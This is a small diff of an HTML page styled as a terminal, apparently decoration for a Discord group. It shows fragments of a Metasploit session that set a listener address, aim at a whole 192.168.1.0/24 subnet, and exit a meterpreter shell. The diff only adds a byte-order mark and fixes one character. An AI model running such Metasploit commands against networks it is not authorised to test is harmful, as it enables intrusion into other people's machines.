@@ -1,4 +1,4 @@
-<span id ="c">msf</span> > setg LHOST 192.168.1.101
+﻿<span id ="c">msf</span> > setg LHOST 192.168.1.101
 <span id ="c">LHOST</span> => 192.168.1.101
 
 <span id ="c">msf</span> > setg RHOSTS 192.168.1.0/24
@@ -23,4 +23,4 @@
 
 <span id ="c">meterpreter</span> > exit
 
-<span id="a">root@wise</span>:<span id="b">~</span><span id="c">#</span>< join <a href="https://discord.gg/uns"> Ⴎniverse Տecret™ ⭐</a>
+<span id="a">root@wise</span>:<span id="b">~</span><span id="c">#</span>> join <a href="https://discord.gg/uns"> Ⴎniverse Տecret™ ⭐</a>
